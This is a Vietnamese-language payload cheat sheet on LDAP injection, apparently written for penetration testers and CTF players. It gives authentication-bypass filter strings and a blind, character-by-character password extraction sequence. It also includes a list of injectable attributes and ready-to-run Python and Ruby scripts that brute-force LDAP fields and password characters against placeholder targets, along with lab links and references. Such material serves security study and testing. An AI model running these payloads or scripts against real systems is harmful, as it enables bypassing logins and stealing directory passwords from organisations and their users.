# LDAP Injection

> LDAP Injection là một cuộc tấn công được sử dụng để khai thác các ứng dụng web xây dựng các câu lệnh LDAP dựa trên input của người dùng. Khi ứng dụng không xử lý và lọc input người dùng đúng cách, attacker có thể sửa đổi các câu lệnh LDAP thông qua một local proxy.

## Tóm tắt

* [Phương pháp](#methodology)

  * [Vượt qua xác thực](#authentication-bypass)
  * [Khai thác Blind](#blind-exploitation)
* [Các Attribute mặc định](#defaults-attributes)
* [Khai thác Attribute userPassword](#exploiting-userpassword-attribute)
* [Scripts](#scripts)

  * [Tìm các LDAP Field hợp lệ](#discover-valid-ldap-fields)
  * [LDAP Injection Blind đặc biệt](#special-blind-ldap-injection)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Phương pháp

LDAP Injection là một lỗ hổng xảy ra khi input do người dùng cung cấp được sử dụng để xây dựng các LDAP query mà không được sanitize hoặc escape đúng cách.

### Vượt qua xác thực

Thử thao túng logic của filter bằng cách inject các điều kiện luôn đúng.

**Ví dụ 1**: LDAP query này khai thác các logical operator trong cấu trúc query để có khả năng bypass authentication.

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

**Ví dụ 2**: LDAP query này khai thác các logical operator trong cấu trúc query để có khả năng bypass authentication.

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### Khai thác Blind

Kịch bản này minh họa LDAP blind exploitation bằng kỹ thuật tương tự binary search hoặc brute-force dựa trên từng ký tự để phát hiện thông tin nhạy cảm như password. Kỹ thuật này dựa trên thực tế rằng LDAP filter phản hồi khác nhau tùy thuộc vào việc điều kiện có khớp hay không, mà không trực tiếp tiết lộ password thực tế.

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

**Phân tích LDAP Filter**:

* `&`: Logical AND operator, nghĩa là tất cả các điều kiện bên trong đều phải đúng.
* `(sn=administrator)`: Khớp với các entry có attribute `sn` (surname) là administrator.
* `(password=X*)`: Khớp với các entry có password bắt đầu bằng X (phân biệt chữ hoa/chữ thường). Dấu sao (*) là wildcard, đại diện cho mọi ký tự còn lại.

## Các Attribute mặc định

Có thể được sử dụng trong injection như `*)(ATTRIBUTE_HERE=*`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## Khai thác Attribute userPassword

Attribute `userPassword` không phải là một string giống như attribute `cn`, mà là một OCTET STRING.

Trong LDAP, mọi object, type, operator, v.v. đều được tham chiếu bằng một OID: `octetStringOrderingMatch` (OID 2.5.13.18).

> octetStringOrderingMatch (OID 2.5.13.18): Một matching rule dùng để so sánh theo thứ tự bằng cách thực hiện so sánh từng bit (theo thứ tự big endian) của hai giá trị octet string cho đến khi tìm thấy sự khác biệt. Trường hợp đầu tiên mà một giá trị có bit 0 trong khi giá trị còn lại có bit 1 sẽ khiến giá trị có bit 0 được xem là nhỏ hơn giá trị có bit 1.

```bash
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## Scripts

### Tìm các LDAP Field hợp lệ

```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

### LDAP Injection Blind đặc biệt

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

Exploitation script của [@noraj](https://github.com/noraj)

```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```

## Labs

* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
* [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)

## Tài liệu tham khảo

* [[European Cyber Week] - AdmYSion - Alan Marrec (Maki) - January 14, 2025](https://web.archive.org/web/20250114083154/https://www.maki.bzh/writeups/ecw2018admyssion/)
* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://web.archive.org/web/20200924103615/https://0xukn.fr/posts/writeupecw2018admyssion/)
* [How To Configure OpenLDAP and Perform Administrative LDAP Tasks - Justin Ellingwood - May 30, 2015](https://web.archive.org/web/20260119175101/https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
* [How To Manage and Use LDAP Servers with OpenLDAP Utilities - Justin Ellingwood - May 29, 2015](https://web.archive.org/web/20160305121823/https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
* [LDAP Blind Explorer - Alonso Parada - August 12, 2011](https://web.archive.org/web/20160120073444/https://code.google.com/p/ldap-blind-explorer/)
* [LDAP Injection & Blind LDAP Injection - Chema Alonso, José Parada Gimeno - October 10, 2008](https://web.archive.org/web/20081010181534/http://blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
* [LDAP Injection Prevention Cheat Sheet - OWASP - July 16, 2019](https://web.archive.org/web/20190719164052/https://www.owasp.org/index.php/LDAP_injection)
